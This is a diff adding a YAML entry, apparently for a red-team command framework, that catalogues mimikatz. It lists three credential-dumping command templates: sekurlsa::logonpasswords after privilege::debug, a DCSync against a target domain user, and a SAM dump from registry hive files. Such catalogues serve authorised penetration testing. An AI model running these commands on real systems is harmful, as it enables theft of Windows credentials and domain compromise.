@@ -1,0 +1,33 @@
+---
+name: mimikatz
+description: Extracts credentials from memory and performs pass-the-hash, pass-the-ticket, and golden ticket attacks
+os: Windows
+ptf_module: null
+---
+commands:
+  - "Dump Credentials (via debug mode)":
+    - type: ["mimikatz","interactive"]
+    - text:
+      - "privilege::debug"
+      - "sekurlsa::logonpasswords"
+    - input: null
+    - output: ["STDOUT",{"PROMPT":"mimikatz"}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-x"
+
+  - "Dump Credentials (via DCSync)":
+    - type: ["mimikatz","interactive"]
+    - text: "Lsadump::dcsync /domain:{STR} /user:{STR}"
+    - input: ["target Active Directory domain","target username"]
+    - output: ["STDOUT",{"PROMPT":"mimikatz"}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-x"
+
+  - "Dump Credentials (via registry dump)":
+    - type: ["mimikatz","interactive"]
+    - text:
+      - "privilege::debug"
+      - "lsadump::sam /system:{FILE} /sam:{FILE}"
+    - input: ["system backup registry hive file","SAM backup registry hive file"]
+    - output: ["STDOUT",{"PROMPT":"mimikatz"}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-x"
+
+...
